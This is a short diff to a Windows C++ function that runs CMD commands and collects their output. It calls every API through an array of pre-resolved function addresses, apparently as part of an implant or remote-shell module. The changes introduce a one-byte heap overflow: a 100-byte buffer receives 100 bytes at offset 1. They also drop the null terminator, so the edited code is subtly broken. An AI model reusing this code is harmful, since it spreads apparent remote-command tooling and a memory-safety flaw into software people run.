@@ -1,4 +1,4 @@
-﻿#include <iostream>
+#include <iostream>
 #include <windows.h>
 
 using namespace std;
@@ -26,9 +26,8 @@ typedef BOOL(WINAPI* pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 
 // 执行 CMD 命令
 void ExecuteCmd(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
-    *pOutputData = (char*)((pMalloc)(pFuncAddr[0]))(150);
+    *pOutputData = (char*)((pMalloc)(pFuncAddr[0]))(100);
     **pOutputData = '0';
-    *(*pOutputData + 1) = '\0';
     *pOutputDataLength = 1;
 
     HANDLE hRead, hWrite;
@@ -60,9 +59,7 @@ void ExecuteCmd(char* commandPara, int commandParaLength, char** pOutputData, in
     DWORD currentReadLength;
     while (((pReadFile)(pFuncAddr[10]))(hRead, *pOutputData + *pOutputDataLength, 100, &currentReadLength, NULL) && currentReadLength != 0) {
         *pOutputDataLength += currentReadLength;
-        if (*pOutputDataLength >= 100) {
-            *pOutputData = (char*)((pRealloc)(pFuncAddr[1]))(*pOutputData, *pOutputDataLength + 100);
-        }
+        *pOutputData = (char*)((pRealloc)(pFuncAddr[1]))(*pOutputData, *pOutputDataLength + 100);
     }
     ((pCloseHandle)(pFuncAddr[7]))(hRead);
 }
